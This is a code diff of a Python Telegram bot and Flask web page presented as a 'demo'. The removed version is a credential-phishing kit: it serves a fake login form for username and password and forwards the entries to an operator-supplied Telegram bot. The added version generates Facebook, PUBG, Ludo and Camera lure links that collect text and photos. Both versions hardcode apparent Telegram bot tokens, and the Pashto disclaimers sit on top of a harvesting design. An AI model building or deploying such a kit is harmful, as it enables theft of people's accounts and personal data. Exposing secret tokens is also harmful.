@@ -1,177 +1,91 @@
-import requests
+import threading
 from flask import Flask, request, render_template_string
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
-import threading
 
 # ================= CONFIG =================
-MAIN_BOT_TOKEN = "7975528068:AAG3llP9evape74taVzaEfJORpu1PMCuiFI"
+BOT_TOKEN = "7975528068:AAGMdgLfamn7Pt2W9WJXdrmtbhiAyTAqVf4"
 WEB_PORT = 8081
-PUBLIC_URL = "http://YOUR_PUBLIC_IP_OR_DOMAIN:8081"
+DISCLAIMER = "⚠️ دا یوازې DEMO دی. ریښتینی اکاونټ، پاسورډ یا شخصي معلومات مه داخلوئ."
+# ==========================================
 
-user_sessions = {}
-
-# ================= KEYBOARD =================
-MAIN_KEYBOARD = ReplyKeyboardMarkup(
-    [
-        ["🧪 Demo Login", "📷 Camera Demo"],
-        ["ℹ️ Disclaimer", "🆘 Help"]
-    ],
-    resize_keyboard=True
-)
-
-# ================= TELEGRAM BOT =================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 سلام!\n"
-        "دا **Training / Demo Bot** دی\n\n"
-        "👇 له مینو څخه انتخاب وکړه",
-        reply_markup=MAIN_KEYBOARD
-    )
-
-async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🆘 Help\n\n"
-        "1️⃣ Demo Login: د Demo فورم لینک\n"
-        "2️⃣ Camera Demo: یوازې Demo پیغام\n"
-        "3️⃣ Disclaimer: قانوني معلومات\n\n"
-        "❗ ریښتینی معلومات مه داخلوئ",
-        reply_markup=MAIN_KEYBOARD
-    )
-
-async def disclaimer(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "⚠️ Disclaimer\n\n"
-        "دا سیستم یوازې د زده‌کړې او UI Demo لپاره دی.\n"
-        "ریښتینی حساب، پاسورډ، یا شخصي معلومات مه داخلوئ.\n"
-        "هیڅ ریښتینی لاګین یا کیمره نه کارېږي.",
-        reply_markup=MAIN_KEYBOARD
-    )
-
-async def camera_demo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📷 Camera Demo\n\n"
-        "دا یوازې Demo دی.\n"
-        "هیڅ عکس نه اخلو، هیڅ کیمره نه فعاله کېږي.\n\n"
-        "✅ قانوني او خوندي",
-        reply_markup=MAIN_KEYBOARD
-    )
-
-async def demo_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    context.user_data["step"] = "name"
-    await update.message.reply_text(
-        "🧪 Demo Login\n\n"
-        "مهرباني وکړه خپل **نوم** ولیکه",
-        reply_markup=MAIN_KEYBOARD
-    )
-
-async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    text = update.message.text
-    step = context.user_data.get("step")
-
-    if text == "🧪 Demo Login":
-        return await demo_login(update, context)
-    if text == "📷 Camera Demo":
-        return await camera_demo(update, context)
-    if text == "ℹ️ Disclaimer":
-        return await disclaimer(update, context)
-    if text == "🆘 Help":
-        return await help_cmd(update, context)
-
-    if step == "name":
-        user_sessions[uid] = {"name": text}
-        context.user_data["step"] = "token"
-        await update.message.reply_text("🤖 اوس د **دوهم Bot TOKEN** ولیکه")
-
-    elif step == "token":
-        user_sessions[uid]["bot_token"] = text
-        context.user_data["step"] = "chatid"
-        await update.message.reply_text("🆔 اوس د **دوهم Bot CHAT ID** ولیکه")
-
-    elif step == "chatid":
-        user_sessions[uid]["chat_id"] = text
-        link = f"{PUBLIC_URL}/demo?uid={uid}"
-        context.user_data["step"] = None
-        await update.message.reply_text(
-            "✅ هر څه تیار شول!\n\n"
-            f"🔗 Demo Link:\n{link}\n\n"
-            "⚠️ دا Demo دی، ریښتینی معلومات مه داخلوئ",
-            reply_markup=MAIN_KEYBOARD
-        )
-
-# ================= FLASK WEB =================
 app = Flask(__name__)
 
-HTML_PAGE = """
+HTML_FORM = """
 <!doctype html>
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Demo Login</title>
+<title>Demo Page</title>
 </head>
 <body>
-<h3>🧪 Demo Login Page</h3>
-<p style="color:red;">
-⚠️ دا تعلیمي Demo دی<br>
-ریښتینی یوزرنیم یا پاسورډ مه داخلوئ
-</p>
+<h3>{{ title }}</h3>
+<p style="color:red;">{{ disclaimer }}</p>
 
-<form method="post">
-<input name="username" placeholder="Demo Username"><br><br>
-<input name="password" placeholder="Demo Password"><br><br>
+<form method="POST" enctype="multipart/form-data">
+  {% if show_text %}
+    <label>Demo Text:</label><br>
+    <input name="demo_text" required><br><br>
+  {% endif %}
 
-<select name="country">
-<option>Afghanistan</option>
-<option>Pakistan</option>
-<option>Iran</option>
-</select><br><br>
+  {% if show_file %}
+    <label>Upload Demo Photo (اختیاري):</label><br>
+    <input type="file" name="photo" accept="image/*"><br><br>
+  {% endif %}
 
-<select name="province">
-<option>Kabul</option>
-<option>Nangarhar</option>
-<option>Herat</option>
-</select><br><br>
-
-<button type="submit">Submit Demo</button>
+  <button type="submit">Submit</button>
 </form>
 </body>
 </html>
 """
 
-@app.route("/demo", methods=["GET", "POST"])
-def demo():
-    uid = int(request.args.get("uid"))
+@app.route("/demo/<item>/<int:uid>", methods=["GET", "POST"])
+def demo(item, uid):
     if request.method == "POST":
-        session = user_sessions.get(uid)
-        data = request.form
+        text = request.form.get("demo_text", "")
+        photo = request.files.get("photo")
 
-        msg = (
-            "🧪 Demo Data\n\n"
-            f"👤 Name: {session['name']}\n"
-            f"📛 Demo Username: {data['username']}\n"
-            f"🔑 Demo Password: {data['password']}\n"
-            f"🌍 Country: {data['country']}\n"
-            f"📍 Province: {data['province']}\n\n"
-            "⚠️ Demo Only"
-        )
+        msg = f"📥 DEMO DATA\nItem: {item}\nText: {text}\nUserID: {uid}"
+        bot_app.bot.send_message(chat_id=uid, text=msg)
 
-        url = f"https://api.telegram.org/bot{session['bot_token']}/sendMessage"
-        requests.post(url, json={"chat_id": session["chat_id"], "text": msg})
-        return "✅ Demo Data Sent"
+        if photo:
+            bot_app.bot.send_photo(chat_id=uid, photo=photo.stream)
 
-    return render_template_string(HTML_PAGE)
+        return "✅ Demo data sent to your Telegram bot."
 
-# ================= RUN BOTH =================
+    return render_template_string(
+        HTML_FORM,
+        title=f"{item.upper()} DEMO",
+        disclaimer=DISCLAIMER,
+        show_text=True,
+        show_file=(item == "camera")
+    )
+
 def run_flask():
     app.run(host="0.0.0.0", port=WEB_PORT)
 
-def run_bot():
-    tg = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
-    tg.add_handler(CommandHandler("start", start))
-    tg.add_handler(MessageHandler(filters.TEXT, text_handler))
-    tg.run_polling()
+# ================= TELEGRAM BOT =================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [["Facebook", "PUBG"], ["Ludo", "Camera"]]
+    await update.message.reply_text(
+        "👋 Demo Bot Ready\n" + DISCLAIMER,
+        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    )
 
-threading.Thread(target=run_flask).start()
-run_bot()
+async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    item = update.message.text.lower()
+    uid = update.message.from_user.id
+    link = f"http://127.0.0.1:{WEB_PORT}/demo/{item}/{uid}"
+
+    await update.message.reply_text(
+        f"🔗 {item.upper()} Demo Link:\n{link}\n\n{DISCLAIMER}"
+    )
+
+bot_app = ApplicationBuilder().token(BOT_TOKEN).build()
+bot_app.add_handler(CommandHandler("start", start))
+bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu))
+
+# ================= MAIN =================
+if __name__ == "__main__":
+    threading.Thread(target=run_flask, daemon=True).start()
+    bot_app.run_polling()
